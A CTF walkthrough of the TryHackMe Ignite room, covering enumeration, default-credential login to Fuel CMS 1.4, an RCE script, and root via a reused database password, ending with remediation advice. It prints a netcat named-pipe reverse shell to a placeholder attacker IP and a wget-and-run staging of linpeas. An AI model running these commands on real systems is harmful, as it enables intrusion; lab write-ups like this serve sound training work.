# 🔥 TryHackMe — Ignite CTF Walkthrough

This comprehensive technical report details the exploitation lifecycle of the Ignite boot-to-root challenge on TryHackMe. The attack chain covers perimeter enumeration, exploiting a known Remote Code Execution (RCE) flaw in Fuel CMS, establishing stable interactive access, and escalating to root via weak credential hygiene in back-end configuration backups.

---

## 🔎 Phase 1: Reconnaissance & Enumeration

### 🗺️ Infrastructure Scanning
A comprehensive port sweep using `nmap` isolates the available attack surface:

```bash
nmap -p- -T4 -v <TARGET_IP>
```
*   **Discovered Port:** `80/tcp` (HTTP) — Hosting a web application.

### 🌐 Web Content Discovery
Navigating to the target IP address reveals a default landing page for **Fuel CMS version 1.4**. To map out the hidden directory structure, directory brute-forcing is performed:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
*   **Identified Path:** `/fuel/` — The administrative control panel authentication gateway.

### 🔐 Authentication Assessment
Testing the deployment for weak out-of-the-box configurations using standard default credentials:
*   **Username:** `admin`
*   **Password:** `admin`

> ⚠️ **Security Finding:** The login portal successfully processed the default credentials, granting full administrative access to the Fuel CMS Dashboard interface.

---

## 💥 Phase 2: Initial Access & Exploitation

### 💉 Fuel CMS 1.4 Remote Code Execution (RCE)
While direct PHP file upload attempts via the dashboard are blocked by active size filters, Fuel CMS v1.4 is highly vulnerable to a known Pre-Authentication Remote Code Execution flaw via specific parameter injection. 

An exploit script targets the page-rendering engine to execute arbitrary shell commands remotely:

```bash
# Executing standard system commands via the RCE exploit payload
python3 fuel_cms_rce.py -u http://<TARGET_IP>/
```

### 🐚 Shell Stabilization Chain
To convert the unstable RCE web-hook into a robust, interactive terminal session, an outbound connection is forced back to an attacker-controlled listener:

1.  **Attacker Local Listener Initialization:**
```bash
    nc -lnvp 1234
    ```
2.  **Victim Payload Execution (Named Pipe Reverse Shell):**
```bash
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> 1234 >/tmp/f
    ```

Upon execution, the terminal session is successfully stabilized. Navigating to the local home directory yields the first primary objective:
*   **🎯 User Flag (user.txt):** Located inside the user's home repository.

---

## 🚀 Phase 3: Privilege Escalation to Root

### 📊 Automated Local Enumeration
To map out local vectors for privilege escalation, the automated audit script `linpeas.sh` is transferred over to the victim machine:

```bash
# Attacker Local Directory Serving LinPeas via Python
python3 -m http.server 9001

# Victim Shell Staging & Execution
wget http://<ATTACKER_IP>:9001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 🔑 Credential Leakage in Backup Assets
The automated audit highlights unencrypted plaintext database configuration files residing in the web application's deployment back-end:

```php
// Inspecting leaked application backup parameters (database.php)
$db['default']['username'] = 'root';
$db['default']['password'] = 'mememe';
```

> 🚨 **Critical Vulnerability:** The database backup file exposed an active system-wide credential reuse pattern where the database password matches the system's root administrative password.

### 👑 Spawning Root Access
Leveraging the discovered credential string to transition permissions up to the highest privilege tier:

```bash
su root
# Enter Password: mememe
```

Executing a shell status check via `whoami` confirms absolute control (`root`). Navigating directly to the administrative home directory finishes the box:
*   **👑 Root Flag (root.txt):** Captured inside `/root/root.txt`.

---

## 🛡️ Remediation & Strategic Defenses

1.  **Enforce Strong Authentication Policies:** Never deploy software in a production or public-facing sandbox with default `admin:admin` credentials intact.
2.  **Execute Strict Patch Management:** Legacy platforms running Fuel CMS v1.4 must be updated to patch systemic parameter injection vulnerabilities.
3.  **Hardened Configuration Management:** Critical database configuration blocks and configuration files containing system parameters must be isolated, strictly permissioned via access controls (`chmod 600`), and sanitized of plaintext system-user passwords.

---
*   **Task Status:** ✔ Room Completed Successfully
